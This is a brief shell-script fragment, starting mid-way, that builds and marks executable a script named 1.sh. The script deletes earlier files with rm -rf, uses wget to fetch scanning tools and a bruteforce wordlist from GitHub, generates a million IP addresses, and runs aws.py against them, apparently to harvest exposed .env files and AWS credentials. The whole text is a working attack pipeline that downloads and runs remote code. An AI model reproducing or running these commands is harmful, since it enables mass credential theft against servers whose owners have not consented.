...
rm -rf 1.sh 2.sh 3.sh && echo 'rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py && rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py env.txt && wget https://raw.githubusercontent.com/priv8-app/tools/main/ipgenport.py && wget https://raw.githubusercontent.com/priv8-app/tools/main/aws.py && wget https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/env.txt && python3 ipgenport.py 1 1000000 && python3 aws.py -l 1 -t 150 -timeout 10 -d -a env -custom env.txt -f' >> 1.sh
chmod +x 1.sh
